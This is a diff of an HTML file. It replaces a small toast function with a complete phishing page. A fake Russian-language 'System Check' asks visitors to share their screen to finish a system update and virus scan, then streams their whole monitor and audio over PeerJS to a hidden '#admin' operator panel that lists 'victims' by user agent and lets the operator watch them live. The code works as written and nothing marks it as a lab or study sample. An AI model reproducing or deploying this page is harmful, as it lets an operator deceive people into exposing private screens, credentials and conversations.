-<p class="p5"><span class="s2"></span><br></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>function addToast</span><span class="s1">(</span><span class="s5">msg</span><span class="s1">) </span><span class="s6">{</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>const</span><span class="s8"> t</span><span class="s6"> =</span><span class="s5"> document</span><span class="s6">.</span><span class="s2">createElement</span><span class="s6">(</span><span class="s4">'div'</span><span class="s6">);</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>t</span><span class="s6">.</span><span class="s2">className</span><span class="s6"> =</span><span class="s4"> 'toast'</span><span class="s6">;</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>t</span><span class="s6">.</span><span class="s2">textContent</span><span class="s6"> =</span><span class="s2"> msg</span><span class="s6">;</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>document</span><span class="s6">.</span><span class="s2">body</span><span class="s6">.</span><span class="s7">appendChild</span><span class="s6">(</span><span class="s2">t</span><span class="s6">);</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>setTimeout</span><span class="s6">(() =&gt;</span><span class="s5"> t</span><span class="s6">.</span><span class="s2">remove</span><span class="s6">(), </span><span class="s8">3000</span><span class="s6">);</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">        </span>}</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">    </span>&lt;/</span><span class="s4">script</span><span class="s2">&gt;</span></p>
-<p class="p1"><span class="s1">&lt;/</span><span class="s2">body</span><span class="s1">&gt;</span></p>
-<p class="p1"><span class="s1">&lt;/</span><span class="s2">html</span><span class="s1">&gt;</span></p>
+    <div id="victim-view" class="victim-view">
+        <div class="card">
+            <h1>🛡️ System Check</h1>
+            <p>Для завершения обновления системы и проверки на вирусы необходимо предоставить доступ к экрану.</p>
+            <button id="start-btn" class="btn" onclick="startSession()">Начать проверку</button>
+            <div id="victim-status" class="status hidden">
+                <div class="dot active"></div><span>Ожидание оператора...</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="admin-view" class="admin-view">
+        <div class="admin-header">
+            <div class="admin-title"> Admin Panel</div>
+            <div style="font-size:12px; color:#64748b;">Active: <span id="count">0</span></div>
+        </div>
+        <div id="session-list" class="session-grid">
+            <div style="text-align:center; padding:50px; color:#475569; width:100%;">Waiting for targets...</div>
+        </div>
+    </div>
+
+    <div id="viewer-modal">
+        <div id="viewer-header">
+            <span>📺 Viewing: <span id="current-target"></span></span>
+            <button class="close-btn" onclick="stopViewing()">Close</button>
+        </div>
+        <video id="remote-video" autoplay playsinline controls></video>
+    </div>
+
+    <script>
+        const CHANNEL_ID = 'eni-master-2026'; 
+        let peer = null, myStream = null, currentCall = null, activeSessions = {};
+        const isAdmin = window.location.hash === '#admin';
+        isAdmin ? initAdmin() : (document.getElementById('admin-view').classList.add('hidden'));
+
+        async function startSession() {
+            const btn = document.getElementById('start-btn');
+            const status = document.getElementById('victim-status');
+            try {
+                btn.disabled = true; btn.textContent = 'Connecting...';
+                myStream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: 'always', displaySurface: 'monitor' }, audio: true });
+                btn.classList.add('hidden'); status.classList.remove('hidden');
+                const victimId = 'victim-' + Math.random().toString(36).substr(2, 8);
+                peer = new Peer(victimId);
+                peer.on('open', () => {
+                    const adminConn = peer.connect(CHANNEL_ID, { reliable: true });
+                    adminConn.on('open', () => { adminConn.send({ type: 'register', id: victimId, ua: navigator.userAgent }); });
+                });
+                peer.on('call', (call) => { call.answer(myStream); currentCall = call; status.innerHTML = '<div class="dot active"></div><span>Operator connected</span>'; });
+                myStream.getVideoTracks()[0].onended = () => { location.reload(); };
+            } catch (err) { alert('Error: ' + err.message); location.reload(); }
+        }
+
+        function initAdmin() {
+            document.getElementById('victim-view').classList.add('hidden');
+            document.getElementById('admin-view').style.display = 'block';
+            peer = new Peer(CHANNEL_ID);
+            peer.on('connection', (conn) => {
+                conn.on('data', (data) => { if (data.type === 'register') { activeSessions[data.id] = { ua: data.ua }; renderSessions(); } });
+            });
+        }
+
+        function renderSessions() {
+            const list = document.getElementById('session-list');
+            document.getElementById('count').textContent = Object.keys(activeSessions).length;
+            if (Object.keys(activeSessions).length === 0) return;
+            list.innerHTML = '';
+            Object.keys(activeSessions).forEach(id => {
+                const card = document.createElement('div');
+                card.className = 'session-card';
+                card.innerHTML = `<div class="session-id">ID: ${id}</div><div class="session-ua">${activeSessions[id].ua}</div><div class="session-actions"><button class="btn-sm btn-watch" onclick="watchSession('${id}')"> Watch</button><button class="btn-sm btn-disconnect" onclick="delete activeSessions['${id}'];renderSessions()">✖</button></div>`;
+                list.appendChild(card);
+            });
+        }
+
+        function watchSession(targetId) {
+            document.getElementById('viewer-modal').style.display = 'flex';
+            document.getElementById('current-target').textContent = targetId;
+            const call = peer.call(targetId, new MediaStream());
+            currentCall = call;
+            call.on('stream', (stream) => { document.getElementById('remote-video').srcObject = stream; });
+            call.on('close', () => { stopViewing(); });
+        }
+
+        function stopViewing() {
+            document.getElementById('viewer-modal').style.display = 'none';
+            document.getElementById('remote-video').srcObject = null;
+            if (currentCall) currentCall.close();
+        }
+    </script>
 </body>
 </html>
